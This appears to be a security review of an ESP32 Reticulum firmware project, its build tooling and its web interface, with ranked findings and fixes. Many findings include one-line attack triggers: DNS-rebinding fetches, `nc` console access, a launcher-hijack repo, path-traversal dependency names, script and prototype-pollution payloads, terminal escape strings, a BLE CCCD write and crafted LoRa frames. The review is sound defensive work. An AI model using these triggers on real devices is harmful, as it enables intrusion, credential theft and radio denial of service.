**Issue:** Browsers send no `Origin` header on same-origin GETs. A page at `http://evil.example:9010` whose DNS record is rebound to `127.0.0.1` fetches `/log?follow=0`, `/hub/nodes` and `/hub/token` as same-origin requests; `_origin_ok()` sees no `Origin` and answers. `Host: evil.example:9010` is never inspected. (POST and the WebSocket upgrade do carry `Origin`, so command execution stays blocked by this path — until combined with the finding above from a localhost origin.)

**Trigger:** Rebinding page → `fetch('/log?follow=0').then(r=>r.text())`.

**Impact:** Read of everything every attached board printed (boot logs, hostnames, whatever the user typed at the console, WiFi SSIDs), node inventory, and the hub token.

**Fix:** Reject requests whose `Host` header is not `localhost[:port]`/`127.0.0.1[:port]`/`[::1][:port]`; require the token on the read endpoints too.

### [Medium] `spangap monitor` (macOS bridge) exposes the raw serial console and the serial log to the whole LAN, unauthenticated

**Where:** `/home/spangap/reticulous/spangap/build-system/spangap-outside:590-604` (device relays bind `0.0.0.0`), `:652-672` (`serve_log`, `0.0.0.0`), `:674-720` (`serve_serial`, `0.0.0.0`, one raw TCP client gets the serial device both ways), `:786-823` (`start_bridge`, Darwin only, always launches the log relay, adds `serial:<dev>:<AUX_PORT>` when `spangap monitor --aux` is on file).

**Attacker:** Any host on the developer's LAN / WiFi.

**Issue:** The relays are bound on all interfaces so `host.docker.internal` can reach them, with no token and no allowlist. The serial relay is a bidirectional splice onto the board's console: whoever connects gets the device CLI (the console is trusted by the firmware, it needs no password) for as long as they hold the socket. The log relay streams the monitor's serial capture. The code comment on `serve_log` acknowledges the exposure ("readable by anything on the dev LAN") but not for the serial relay. The `spangap dev` relays (`:2693-2701`, `dev-forward`) also bind `0.0.0.0` for the device's ssh/http/wss/tcp-cli ports, which re-exposes a device that only the dev host can reach (USB-network, VPN, a second NIC) to the LAN.

**Trigger:** `nc <devhost> <AUX_PORT>` then type CLI commands; `printf 'FOLLOW\n' | nc <devhost> <LOG_PORT>`.

**Impact:** Full console on the aux-attached board; log disclosure; LAN reach to device services through the dev machine.

**Fix:** Bind the relays to the Docker gateway address only (or `127.0.0.1` plus a `pf`/`socat` rule), or front them with the same per-workspace token the hub uses; at minimum do not run the serial relay unless `--aux` is set in this invocation and print a warning naming the exposed port.

### [Medium] `spangap` launcher trusts whatever workspace it finds above `$PWD`, and a workspace can overwrite the on-PATH launcher

**Where:** `/home/spangap/reticulous/spangap/spangap:80-92` (`find_workspace` walks up from cwd), `:224-231` (`exec "$ws/spangap/build-system/spangap-outside"`); `spangap-outside:1236-1262` (`maybe_upgrade_launcher` copies `$skel_dir/spangap` over `$(command -v spangap)` when its `SPANGAP_LAUNCHER_VERSION` is larger, runs on every verb, `:1268`).

**Attacker:** Anyone who gets the user to run `spangap` inside a directory tree they control (a cloned repo, a shared drive, an unpacked archive) — the same class as git's `safe.directory`.

**Issue:** No ownership/trust check on the workspace marker or on `spangap-outside`; the launcher `exec`s attacker-controlled shell as the user. `maybe_upgrade_launcher` then makes that persistent by replacing `~/.local/bin/spangap` with the attacker's copy (any version number larger than 1 wins; no signature, no confirmation).

**Trigger:** Attacker repo contains `spangap.workspace.yaml`, `spangap/build-system/spangap-outside` (payload) and `spangap/spangap` with `SPANGAP_LAUNCHER_VERSION=999`. Victim: `cd repo && spangap show`.

**Impact:** Arbitrary code execution as the user, persisted on PATH.

**Fix:** Refuse workspaces not owned by the current uid (or require `spangap.workspace.yaml` to be in `$HOME` or an allowlist); never auto-replace the launcher without an explicit `spangap self-update`; verify the skeleton copy against `spangap.sha256` from the trusted install source.

### [Medium] Dependency straddles are cloned by unvalidated name and pulled from a floating branch on every build

**Where:** `spangap-outside:2097-2123` (`clone_spec`: `repo=${bare#*/}`, `dest="$workspace/$repo"`, `git clone https://github.com/${bare}.git`, `git checkout "$ref"`), `:2010-2025` (`pull_dep`: `git pull --ff-only` on every build unless `SPANGAP_NO_PULL`), `:2142` and `:2153-2160` (specs come from `--with` and from every staged straddle's `additional_installs`/`requires`).

**Attacker:** The author of any straddle in the dependency graph (third-party supply chain), or anyone with push access to any dependency's `main`.

**Issue:** (1) `additional_installs` names are used as GitHub paths and as filesystem paths. The straddle schema (`spangap/build-system/schemas/straddle.schema.json`) constrains `name` to `^[a-z0-9._-]+/[a-z0-9._-]+$`, which still admits `org/..` and `org/...`; and host-side `--with` values (`prefetch_explicit_includes`, `spangap-outside:2131-2150`) are cloned before any schema check runs at all. A spec of `x/..` makes `dest="$workspace/.."` so `pull_dep` runs `git -C <parent of workspace> pull`, and `repo` values with `@ref` reach `git checkout` unvalidated, so a name of `org/..` makes `dest` escape the workspace and `pull_dep` runs `git -C` there; `ref` after `@` is passed to `git checkout` unquoted-by-policy so a value beginning with `-` becomes an option. (2) No commit pinning: every build fast-forwards every clean dependency clone to its remote head, so a compromised upstream branch lands in the next firmware image silently; there is no lock of dependency commits (the `dependencies.lock` in `reticulous` is the ESP-IDF component-manager lock, not straddles). (3) Each staged straddle's `browser/package.json` is `npm install`ed inside the build container (`deploy.sh:16-19`, `spangap-inside:5603,5977`), so a straddle can run arbitrary npm lifecycle scripts; that is inherent to building third-party firmware but should be stated in the straddle-author trust model.

**Trigger:** Publish a straddle with `additional_installs: [ "x/../../home/user/.ssh" ]` or push to a dependency's `main`.

**Impact:** File-system writes outside the workspace on the host (git into arbitrary dirs), arbitrary code in the build and in the firmware image without any local change.

**Fix:** Validate `org/repo[@ref]` with `^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+(@[A-Za-z0-9_./-]+)?$` and reject `..`; pass `--` before refs; record resolved commits in a workspace lock file and only move them on an explicit `spangap update`.

### [Medium] Viewer iframe is unsandboxed at the device origin and follows config-supplied URLs

**Where:** `/home/spangap/reticulous/viewer/browser/src/panels/ViewerWindow.vue:28-33` (`<iframe :src="src">`, no `sandbox`), `:61-70` (`toSrc` passes any `http(s)://` through), `:158` (driven by `viewerWebUrl`), `viewer/browser/src/modules/viewer.ts` (`s.viewer.home_web`, `s.viewer.once_web`, `viewer.web.url` from the device CLI `webview`).

**Attacker:** Anyone who can place a file on the device's served tree (SD card via WebDAV, `.html`/`.md` dropped by any future file-receiving feature) or set `s.viewer.*`.

**Issue:** The frame is same-origin with the SPA and carries the session cookie (that is the stated intent). Any `.html` file served from `/sdcard` or `/state`, and any `.md` file — the device renders Markdown with `md_html(in, len, sink, &body, 0, 0)` (`/home/spangap/reticulous/viewer/esp-idf/conditional/spangap-web/src/md_transform.cpp:157`), i.e. parser and renderer flags both 0, so MD4C passes raw HTML blocks and inline `<script>` through verbatim — executes as the SPA origin with full access to `parent`, `document.cookie` (the cookie is not HttpOnly, see below) and the WebRTC session. A cross-origin `http(s)` URL in `s.viewer.home_web` loads inside the admin UI with no `sandbox`, enabling top-navigation and clickjacking-style overlays inside the window.

**Trigger:** `webview /sdcard/x.html` or `s.viewer.home_web=https://attacker/` (config), where `x.html` contains `<script>fetch('/state/boot',{method:'PUT',body:...})</script>`.

**Impact:** Full-privilege actions on the device from a document; the mitigating factor is that writing to the served tree already needs admin (WebDAV) or CLI access, so this is mainly a privilege-persistence / phishing surface today.

**Fix:** Add `sandbox="allow-same-origin allow-scripts allow-forms allow-popups"` is *not* enough for same-origin content; instead serve user files from a separate origin/port or with `Content-Security-Policy: sandbox` on `/sdcard` and `/state` responses, refuse non-same-origin URLs unless the user typed them, and only allow `.md` (rendered with `MD_FLAG_NO_HTML`) and text types in the viewer.

### [Low] Session cookie is set from JavaScript without `HttpOnly`/`Secure`; XSS anywhere in the SPA yields the credential

**Where:** `/home/spangap/reticulous/spangap-web/browser/src/lib/auth.ts:46-48` (`document.cookie = \`session=${cookie}; path=/; max-age=5184000; SameSite=Strict\``), `:22-32` (`/auth/login` returns the cookie value in the JSON body).

**Attacker:** Any XSS in the SPA or in a same-origin document (viewer finding above), or a browser extension.

**Issue:** The device returns the session token in the response body and the SPA writes the cookie itself, so it can never be `HttpOnly`; `Secure` is also omitted, so the 60-day cookie would ride a plain `http://` request if the device ever answers one. `SameSite=Strict` is set, which does protect the `PUT`/`POST` endpoints against classic CSRF.

**Trigger:** `document.cookie` from any injected script.

**Impact:** 60-day admin session theft.

**Fix:** Have `/auth/login` set the cookie with `Set-Cookie: ...; HttpOnly; Secure; SameSite=Strict` and stop returning it in the body; keep `checkAuth()`'s header probe for state.

### [Low] `deepMerge` on the config mirror accepts `__proto__` keys (prototype pollution from the storage channel)

**Where:** `/home/spangap/reticulous/spangap-web/browser/src/stores/device.ts:92-117` (`deepMerge`: `for (const key of Object.keys(src))` … `dst[key] = {}` / `deepMerge(dst[key], val)`), fed by `dc.onmessage` at `:283-296`.

**Attacker:** Whatever can write JSON into the device's config tree or spoof the storage DataChannel — today that is the device itself (trusted) or a firmware path that stores peer-supplied strings under keys it does not sanitise.

**Issue:** `JSON.parse('{"__proto__":{"polluted":1}}')` yields an own `__proto__` key; `deepMerge` then does `deepMerge(settings.__proto__, val)`, i.e. writes into `Object.prototype` for the whole SPA. Every `typeof x.foo === 'number'` style check in the settings renderer becomes attacker-influenced.

**Trigger:** A storage patch containing a `__proto__` or `constructor` key.

**Impact:** Logic corruption up to XSS via gadgets in Vue/Quasar; low today because the sender is the trusted device.

**Fix:** Skip `__proto__`, `constructor`, `prototype` keys in `deepMerge`/`mergeIntoArray`/`set`, or build the mirror from `Object.create(null)` objects.

### [Low] Mesh-controlled strings reach xterm.js unfiltered (terminal escape injection in Log/CLI windows and `spangap log`)

**Where:** `spangap-web/browser/src/components/LogWindow.vue:118-123` (`term.write(text)` of raw device log), `TerminalWindow.vue:214`; `spangap-inside:4586-4606` (`_emit` strips CSI/OSC from the data but not from the node label: `tag = f"[{label}] "`, label = the device-reported hostname from the tab's `hello`, `:4640-4650`).

**Attacker:** A mesh peer (announce app_data / display names / hostnames end up in device log lines) or a device with a crafted hostname attached to flashmon.

**Issue:** xterm.js 6.0 is robust against code execution, but cursor-movement/erase sequences let a peer rewrite or hide earlier log lines in the operator's view; on the host, `spangap log` prints the hostname label unstripped into the user's real terminal (title changes, OSC 52 clipboard writes in terminals that allow it).

**Trigger:** Peer display name containing `\x1b[2J\x1b[H` or hostname `x\x1b]52;c;<base64>\x07`.

**Impact:** Log spoofing, hidden lines, clipboard write on permissive terminals.

**Fix:** Strip C0/CSI/OSC from peer-derived strings on the device before logging; in `_emit` apply `_ANSI_RE` to `label` as well; consider `term.write` through a filter that drops OSC.

### [Low] `spangap cli` (host) creates and uses the user's default `~/.ssh/id_ed25519` and accepts new host keys silently

**Where:** `spangap-outside:1511-1523`.

**Attacker:** A LAN host impersonating the device address on first contact.

**Issue:** If the user has no default key, one is generated with an empty passphrase at the default path (now also their key for everything else); `StrictHostKeyChecking=accept-new` pins whichever host answers first.

**Trigger:** ARP/DNS spoof `reticulous.local` before the first `spangap cli`.

**Impact:** Trust-on-first-use pin to an attacker; a broader-than-intended personal key.

**Fix:** Use a workspace-local key (`$workspace/.spangap-ssh/id_ed25519`) and a workspace-local `known_hosts`; print the device fingerprint on first pin.

### [Low] `/auth/passwd` is used as a read probe on every page load

**Where:** `spangap-web/browser/src/lib/auth.ts:55-58` (`isAdminUnset()` → `authPasswd('admin', '', '')`), called from `MainLayout.vue:180`, `LoginPage.vue:61`, `SetupPage.vue:73`.

**Attacker:** n/a (robustness).

**Issue:** The SPA's "is the admin password set?" check is a write request with empty old/new. Correctness depends on the firmware refusing an empty new password in every future revision; a regression there would let every page load reset an unset password to "" (harmless today only because it is already unset). First-boot is race-open by design: whoever reaches `https://192.168.1.1` on the open AP first sets the admin password (`WELCOME.md`).

**Fix:** Add a read-only `GET /auth/state` (or reuse the `X-Authenticated` HEAD probe) and drop the passwd probe.

### [Low] STUN to Google on every WebRTC connect

**Where:** `spangap-web/browser/src/lib/webrtc-session.ts:229-231` (`iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]`).

**Issue:** A LAN-only admin UI sends the browser's public/reflexive address to Google each session, and fails silently offline. Privacy/telemetry, not compromise.

**Fix:** Drop the STUN server (host candidates suffice on LAN) or make it a setting.

### [Info] CI and installers: unpinned fetches

**Where:** `flashmon/.github/workflows/build.yml:33-37` (`curl` of `spangap` from `refs/heads/main`, no checksum, `workflow_dispatch` only, `permissions: contents: read` — good); `spangap/install.sh:190-215` (checksum fetched from the same base URL as the launcher — integrity only against transfer corruption, not a compromised source; soft-skipped if absent); `spangap/build-system/Dockerfile` (base image by tag `espressif/idf:v5.5.4`, `pip3 install pyyaml jsonschema`, `pip install Pillow cairosvg fonttools pypng lz4` unpinned, container user has `NOPASSWD` sudo); `install-reticulum:46-47` (`pip install --upgrade rns rnsh` from PyPI); `flashmon.py:136-141` (first run `pip install esptool esp-idf-monitor` unpinned into a private venv); `spangap-inside:5207` (`npm install -g @anthropic-ai/claude-code` unpinned); `spangap-core/esp-idf/scripts/update-zones.py:27` (fetches `zones.json` from a third-party GitHub `master` at build-maintenance time). The `dco.yml` workflows interpolate only SHAs from `github.event` into `run:` — no injection; no `pull_request_target` anywhere. The five `.whl` files in the workspace root are referenced by nothing in the tooling (stale; if they are meant for offline installs they need `--require-hashes`).

**Fix:** Pin by digest/version + hash where the artefact ends up in a shipped image (IDF image digest, pip `--require-hashes`, npm exact versions); publish `spangap.sha256` from a different trust root or sign the launcher.

### [Info] Dock icons are injected with `v-html` from straddle-supplied SVG

**Where:** `spangap-web/browser/src/components/Dock.vue:30,48`, `lib/apps.ts:44-50` (`registerAppIcons` strips only the XML prolog).

**Issue:** `innerHTML` does not run `<script>` but does fire inline handlers (`<svg onload=…>`). The SVGs come from each staged straddle's `browser/src/app-icons` at build time, so a third-party straddle gets script in the SPA — but that straddle already ships native code in the same image, so this adds nothing today. Worth a `DOMPurify`-style whitelist or `<img src="data:image/svg+xml…">` if straddles are ever installed from untrusted catalogues without a firmware component.

### [Info] `spangap dev` proxy disables TLS verification

**Where:** `reticulous/web-interface/quasar.config.ts` devServer proxy: `{ target: https://${device}, changeOrigin: true, secure: false }`.

**Issue:** Development only; the browser talks plain `http://localhost` to Vite, which forwards the session cookie to the device without certificate checks. Acceptable for a self-signed device but worth noting that the cookie set with `SameSite=Strict` and no `Secure` flag is what makes this work.

### Not reached

- How `settings:`/`browser_register:` YAML values are emitted into `straddles.gen.ts` and generated C++ by `spangap-inside` (schema-validated with jsonschema at `spangap-inside:39,4900`; `prefix` is constrained to `^([a-zA-Z][a-zA-Z0-9_-]*)?$`, so path/symbol injection via `prefix` is closed — the emission code itself was not read; a straddle author already has native code, so the residual impact is build-host effects only).
- `oldstuff/*` workflows (retired), `rns/browser/src/panels/MapWindow.vue` tile-server URL (privacy of node positions), lxmf `ConversationList`/`AnnouncesView`/`ContactCard` beyond the sink grep (all clean — interpolation only).

## Positive notes

- The Micron renderer (`nomad/browser/src/lib/micron.ts`) is a careful allowlist renderer: every literal run and every attribute value goes through `escapeHtml`, colours are validated by regex before entering `style`, link targets live in `data-mtarget` (never `href`) and are resolved by `NomadWindow.followTarget`, which only knows Nomad hashes and `lxmf@` addresses — no `javascript:`/`data:` surface from remote pages.
- LXMF message bodies are rendered by interpolation; the only `href` is limited by regex to `https?://` and carries `target="_blank" rel="noopener noreferrer"` (`lxmf.ts:461-472`, `MessageBubble.vue:41`). Nomad links from messages go through a device sentinel, not the DOM.
- netgraph, rns NodesWindow, loramon and lcdmirror bind peer strings with `{{ }}`/`:title` only; no `v-html`/`innerHTML` fed by device data anywhere in the SPA except the fixed reboot cover and the build-time icons.
- Nothing sensitive is persisted in the browser: localStorage holds window geometry, zoom, log backlog size, a rail width and the selected LXMF identity index; no cookie/token/secret/message content, no IndexedDB.
- `SameSite=Strict` on the session cookie neutralises CSRF against `PUT`/`POST` device endpoints; the WebSocket signalling and DataChannels are same-origin only (`device-url.ts`).
- flashmon's browser side has no HTML sinks at all (`flashmon.js` grep clean), catalogue names are sanitised to `[A-Za-z0-9._-]` and always resolved relative to the deployment (`flashmon.js:95-113`), vendored libraries are loaded from the same origin (no CDN), and the hub client only ever connects when the page is itself served from localhost over plain http.
- The hub's static handler resolves paths and refuses anything outside `flashmon/flashmon` and `builds/` (`spangap-inside:4497-4504`); flashmon's port is published on `127.0.0.1` only.
- Dependency versions in use are current (vue 3.5.35, pinia 3.0.4, quasar 2.19.3, @xterm/xterm 6.0.0, vite 7.3.5, esbuild 0.25.12, rollup 4.61.1); all lockfile `resolved` URLs are `registry.npmjs.org`.
- The GitHub workflows use `permissions: contents: read`, no `pull_request_target`, and only SHA fields from the event payload.

---

# iface-lora, iface-tcp, iface-auto, iface-espnow, iface-ble, rnode-ble, loramon

Pre-release security review of the Reticulum interface straddles, read-only,
2026-09-09/10. Attacker model: anyone on the air / LAN / TCP / BLE path; no
authentication assumed beyond IFAC where configured. IFAC verification inside
rnsd was reviewed separately and found correct, so this report is about what
the straddles do to bytes *before* rnsd sees them, and about anything an
interface lets network bytes reach that is not rnsd.

## Coverage

Read in full: iface-tcp/esp-idf/src/tcp.cpp; iface-auto/esp-idf/src/auto.cpp;
iface-espnow/esp-idf/src/espnow.cpp; iface-lora/esp-idf/src/{lora.cpp,
lora_priv.h, lora_bridge.cpp, lora_rnode.cpp, lora_rnode.h, esp_idf_hal.cpp,
lora_power.cpp, lora_peers.cpp, lora_observe.cpp, lora_supe.cpp, supe.cpp},
iface-lora/esp-idf/include/rnode_door.h, supe_engine.cpp lines 1655-2140 (the
over-the-air frame handlers) and its function map, lora_mon.cpp 590-770 (the
frame classifier), lora_cli.cpp 630-700 and 990-1110 (`supe rx` injector and
`set` validation); iface-ble/esp-idf/src/{ble_iface_priv.h, ble_frag.cpp,
ble_peers.cpp, ble_iface.cpp, ble_gattc.cpp}; rnode-ble/esp-idf/src/rnode_ble.cpp;
spangap-ble/esp-idf/src/ble_sec.cpp (the pairing/bond policy the BLE doors
rest on); NimBLE's CCCD flag derivation (ble_gatts.c); loramon's record parser
(loramon_lcd.cpp 372-400) and the label/name paths of both viewers; every
README.md and the relevant INTERNALS.md sections (iface-lora §5, §6, §17;
iface-ble §1-4); the `rnsd_iface_t` contract in rns/esp-idf/include/ports.h and
rnsd's `onTransportConnect` / `onTransportRecv` / `onIfaceAux` (rnsd.cpp
779-1000) to see what happens to what the straddles hand over.

Not read (noted, not reviewed): iface-lora lora_csma.cpp, lora_airtime.cpp,
lora_fem.cpp, lora_rfcal.cpp, lora_chanplan.cpp, lora_queue.cpp, lora_radio.cpp
beyond the RX-discard/IRQ helpers, the remaining ~1400 lines of supe_engine.cpp
(schedule/slot/timer/train machinery — a much larger unauthenticated state
machine than the handlers I traced), lora_mon.cpp outside the classifier,
loramon's Vue panel beyond its text-rendering paths, spangap-ble's ble.cpp /
ble_gap.cpp (the connection budget and address rotation), and the browser side
of every straddle. RadioLib was out of scope as vendored upstream.

## Findings

Ranked by exploitability: on-air / LAN reachable and default-on first.

### [Medium] rnode-ble: an unbonded BLE central can open the RNode session — subscribe is not encryption-gated
**Where:** rnode-ble/esp-idf/src/rnode_ble.cpp:105-114 (TX characteristic flags `NOTIFY | READ_ENC`, no `NOTIFY_INDICATE_ENC`), :372-391 (`onBleSubscribe` → `sessionOpen()` on any CCCD write), :85-104 in iface-lora's lora_rnode.cpp (`rnodeForwardData` notifies every radio packet to the attached session); NimBLE ble_gatts.c `ble_gatts_chr_clt_cfg_flags_from_chr_flags` (CCCD gets `READ|WRITE` only, `WRITE_ENC` is added only for `NOTIFY_INDICATE_ENC`); door default on: iface-lora/esp-idf/src/lora.cpp:1406 (`s.lora.rnode.ble` = 1).
**Attacker:** anyone within BLE range, no pairing, no bond, no pairing window.
**Issue:** The KISS RX characteristic is correctly `WRITE_ENC`, so an unbonded central cannot send commands. But the session is *opened* on the CCCD write of the TX characteristic, and NimBLE only protects a CCCD when the characteristic carries `BLE_GATT_CHR_F_NOTIFY_INDICATE_ENC`; `READ_ENC` does not do it. `ble_gatts_notify_custom` performs no security check either. So a plain central connects to "RNode xxxx", writes 0x0001 to the CCCD, and (a) `sessionOpen` claims the single RNode endpoint (`RNODE_ITS_PORT` has `maxHandles = 1`), and (b) from then on every Reticulum packet the LoRa radio receives or transmits is pushed to it as `CMD_STAT_RSSI`/`CMD_STAT_SNR`/`CMD_DATA` notifications, plus the config echo (frequency, bandwidth, SF, CR, TX power) whenever the apply pass runs.
**Trigger:** `gatttool -b <addr> --char-write-req -a <cccd of 6e400003> -n 0100` and listen; keep the connection up.
**Impact:** The legitimate bonded phone, the serial door and the TCP door are all refused for as long as the attacker holds the connection (`onRnodeConnect` returns -1 while `s_rnode.handle >= 0`); the attacker gets a live feed of the radio segment with per-packet RSSI/SNR and the radio's configuration. RNS payloads are end-to-end encrypted and the air is a shared medium anyway, so the disclosure is bounded; the session monopoly is the real damage, and it costs the attacker nothing.
**Fix:** Add `BLE_GATT_CHR_F_NOTIFY_INDICATE_ENC` to the TX characteristic so the CCCD requires an encrypted link; additionally have `onBleSubscribe` check `ble_gap_conn_find(...).sec_state.encrypted` (or spangap-ble's `bleIsBonded`) before `sessionOpen()`.

### [Medium] iface-lora: a 2-byte SPLIT head every <5 s denies this node's transmit (and breaks every real split packet)
**Where:** iface-lora/esp-idf/src/lora_bridge.cpp:449-482 (`bridgeFrameDeliver`: a split head sets `splitPending` for `SPLIT_RX_TIMEOUT_MS` = 5 s; a head with a *different* seq while one is pending restarts assembly and the deadline), :999 (`drainOneOutbound`: `if (!r->running || r->splitPending) return;`), lora.cpp:888 (`nextDeadline` likewise gates outbound on `!splitPending`), lora_priv.h:66.
**Attacker:** anyone on the LoRa channel (same frequency/SF/BW/sync word); IFAC does not help because the 1-byte split header is outside the RNS packet and is parsed before rnsd.
**Issue:** Half-duplex coordination holds all outbound while a split reassembly is pending. Reassembly is armed by any frame whose header byte has bit 0 set (and low nibble 0/1), with no sender binding beyond a 4-bit seq. A head frame of 2 bytes (header + 1 payload byte) is enough. Nothing rate-limits or de-prioritises repeated heads; a head with a new seq evicts the reassembly in progress.
**Trigger:** Transmit `[0xN1, 0x00]` (any seq nibble N, SPLIT set) every ~4.9 s. Airtime cost to the attacker at SF7/125k: ~30 ms per 5 s.
**Impact:** (1) The victim never transmits: rnsd's outbound backs up, `lbt_timeout` never fires because CSMA is never entered, and after 100 ms rnsd drops each packet with "ITS send dropped". Effectively a full TX-side jam at 0.6 % duty cycle. (2) Alternating seq values between the two halves of any legitimate >254-byte packet (most announces with app_data, all 500-byte link payloads) discards that packet, i.e. selective corruption of large frames only. Applies to every node on the channel simultaneously.
**Fix:** Do not gate outbound on `splitPending` unconditionally: gate only for the expected time-on-air of the partner frame (≤ `rxPacketTicks`), not 5 s; keep the 5 s only for discarding the buffer. Bind the second half to the first by requiring `payloadLen == RNODE_MAX_PAYLOAD` for a head (a genuine head is always the full 254 bytes — the classifier already uses this rule at lora_mon.cpp:648) and drop short heads.

### [Medium] iface-lora: SUPE ANNOUNCE ingest is unauthenticated and runs on every node without IFAC, SUPE.enable or not
**Where:** iface-lora/esp-idf/src/lora_supe.cpp:969-978 (`supeOnFrame`: `SUPE_T_ANNOUNCE` is "always read" when `supeMounted`), :713-820 (`annIngest`), lora.cpp:500-517 (`supeInit` runs whenever `ifac_size == 0`, regardless of `SUPE.enable`), lora_peers.cpp:329-424 (`peersMergeInto`), lora_power.cpp:247-263 + :438-457 (path-loss pairs feed the transmit-power derivation).
**Attacker:** anyone on the LoRa channel.
**Issue:** A SUPE ANNOUNCE frame (`0xC2..0xDF` type byte, 5-byte base, then 4-byte identity prefixes, no signature) is decoded and applied to the neighbour table by every node that has no IFAC access code, including nodes with `SUPE.enable = 0`. From `annIngest` an attacker can: (a) name the 4-byte prefixes of two *different* real neighbours in one frame → `peersMergeInto` folds their rows permanently ("folded into one node"), so their adaptive-power evidence, quality counters, link ids and the rnsd neighbourhood declaration are conflated (rnsd is told one of them left: `peersRnsdWithdraw`); (b) send `regime = SUPE_REGIME_NONE` for a real neighbour's prefix → `supeSeen = ourProto = false`, so this node stops meeting that peer over SUPE (silent downgrade); (c) send any regime with a low `pwrDbm` and be heard at a strong level → `supeFilePair` files a bogus path loss, and on a SUPE-speaking node `apDerive` then opens toward that peer at the minimum power (`apClamp` floor = `minTxDbm`) — the link to that peer goes deaf until the failure floor recovers it; (d) allocate rows (`peersAlloc`) with fresh prefixes, evicting the least-recently-heard real neighbour (24 rows).
**Trigger:** e.g. `[0xCx, regime<<4|version, caps, caps, level, id0(4), id1(4)]` where id0/id1 are the first 4 bytes of two real nodes' identity hashes (visible in the clear in every announce they send).
**Impact:** Persistent mis-attribution in the passive neighbour table and rnsd's neighbourhood, and on SUPE-enabled nodes a targeted transmit-power denial toward chosen peers. No memory-safety issue: `supeDecAnn` bounds `count` by length and `SUPE_ANN_MAX`.
**Fix:** Gate `annIngest` on `supeReady()` like every other SUPE frame (a non-speaking node loses only the "who speaks SUPE" picture, which it does not use); never merge rows on an unsigned claim — treat ANNOUNCE-supplied identities as stubs (`peersHashAdd`) rather than `peersMergeInto`; ignore `SUPE_REGIME_NONE` for a peer whose last signed announce is recent; require a fresh *signed* Reticulum announce before a path-loss pair from an unsigned frame is used by `apDerive`.

### [Medium] iface-lora: with SUPE enabled, an unauthenticated HAIL/GOT/READY drives the radio off the hailing channel and makes it transmit
**Where:** iface-lora/esp-idf/src/supe_engine.cpp:1655-1770 (`onHail`: any HAIL whose 3-byte tag is in our tag set is answered, schedule installed), :1858-1934 (`onGot`), :1936-1995 (`onReady` → `tuneToBudget`, `startTrain`), lora_supe.cpp:111-140 (`hTune` retunes frequency/BW/SF/sync), :1076-1083 (8 s meeting watchdog), lora.cpp:500 (`SUPE.enable` default 0).
**Attacker:** anyone on the LoRa channel, against a node with `s.lora.<n>.SUPE.enable = 1`.
**Issue:** The whole meeting protocol is unsigned. Our tags (first 3 bytes of our destination hashes, transport identity, link ids) are public — they are in every packet we send. A HAIL naming one of them makes the node answer (`deferSend(SUPE_PEND_HAIL_ANSWER)` → READY/GOT transmit), and a plausible GOT/READY with the right 3-byte `hash3` (derived from the HAIL bytes the attacker chose) makes it retune to a regime channel and configuration and wait for a train that never comes, up to `SUPE_MEET_WATCHDOG_MS` = 8 s, then come home. Repeatable without limit; the "unanswered" hold (`SUPE_HOLD_*`) applies to peers we hail, not to hails we receive.
**Trigger:** Loop: HAIL(tag = victim's transport identity prefix, count=1) → wait flip → GOT(hash3 = SHA-256(HAIL bytes)[0..2], budget = top step) → silence. The victim sits on the detour channel deaf to the hailing channel for ~8 s per round.
**Impact:** Deafness on the hailing channel and forced transmissions on regime channels for as long as the attacker keeps hailing; also the airtime ledger is charged. Opt-in feature, and the state machine is bounded (I found no unbounded index: `supeDecGot` masks are sized from *our* train count, `supeDecEnd`/`supeDecResend` are length-checked, `SUPE_TRAIN_MAX` caps every count).
**Fix:** Rate-limit answered hails per tag and per source level (e.g. one meeting per N seconds per `hash3`), require a train frame within `SUPE_TURNAROUND_MS` of a READY before committing to the full watchdog window, and document that SUPE is a trusted-neighbourhood feature. Longer term, sign HAIL with the announcing identity.

### [Medium] iface-lora RNode TCP door: unauthenticated radio reconfiguration and injection, with two unbounded fields
**Where:** iface-lora/esp-idf/src/lora_rnode.cpp:169-338 (`rnodeFrame`), :232-247 (`RN_CMD_TXPOWER`: only an upper clamp; `int8_t` −128..−20 is persisted as-is), :204-216 (frequency accepted anywhere in 100 MHz–2 GHz), :284-306 (`RADIO_STATE OFF` persists `enable = 0`), :403-434 (TCP door on port 7633, `publicFacing` from `s.lora.rnode.upnp`); lora.cpp:278-283 (`txp < -19` → radio refuses to start, state `unconfigured`).
**Attacker:** any host that can reach TCP 7633 (LAN; the internet if `s.lora.rnode.upnp = 1`). Off by default (`s.lora.rnode.tcp` = 0).
**Issue:** By design the door is a stock RNode: no authentication, and every `CMD_FREQUENCY`/`BANDWIDTH`/`SF`/`CR`/`TXPOWER` is written to `s.lora.<n>.*` and persists across reboot. Two concrete gaps beyond the documented hazard: `CMD_TXPOWER` has no lower bound, so `txp = -100` is stored and `radioStart` then refuses to bring the radio up at all ("configure freq/bw/sf/cr/txp first") — a persistent, silent radio-off that survives the client leaving; and the frequency check is the unit-bridge sanity range, not a band, so the radio can be parked at 100 MHz or 2 GHz where `radioBegin` fails and the state goes to `error`, again persisted. `CMD_DATA` injects arbitrary ≤500-byte packets into both the air and rnsd (with a synthetic −10 dBm/10 dB signal), and the client receives every radio packet.
**Trigger:** `nc <host> 7633` and send `C0 03 9C C0` (TXPOWER −100) then `C0 06 01 C0`.
**Impact:** Persistent denial of the LoRa interface (until an operator resets `tx_power`), arbitrary radio retune, and unauthenticated read/write access to the radio segment. Regulatory: an attacker can move the radio to any frequency in 100 MHz–2 GHz.
**Fix:** Clamp `CMD_TXPOWER` to `[minTxDbm, RNODE_TXP_MAX]` (the radio already knows its floor); validate frequency against the same band table the CLI/settings should use (see the Info item on frequency bounds); keep the door off by default and add a warning line when `upnp` is set on it; consider not persisting client-set parameters (or persisting under a separate key restored on client detach).

### [Medium] iface-auto: LAN attacker fills the 16-entry peer table with spoofed link-local sources
**Where:** iface-auto/esp-idf/src/auto.cpp:498-535 (`handleDiscovery`), :514 (`MAX_PEERS` refusal), :592-606 (`drainOutbound` fan-out), :534 (`rnsdIfaceAnnounceNow` per new peer).
**Attacker:** anyone on the same L2 segment, no IFAC needed.
**Issue:** A peer is admitted on a 32-byte token equal to `SHA-256(group_name || text(src))`. The group name is public (default "reticulum") and the source address is whatever the attacker puts in the IPv6 header, so a token for any address is computable. No per-source rate limit, no requirement that `src` be link-local, and a full table refuses new peers rather than evicting the least recent.
**Trigger:** From one host send 16 UDP datagrams to `ff12:0:<group hextets>`:29716 (or unicast to the victim's :29717), each with a distinct spoofed `fe80::…` source and its token; repeat every <22 s.
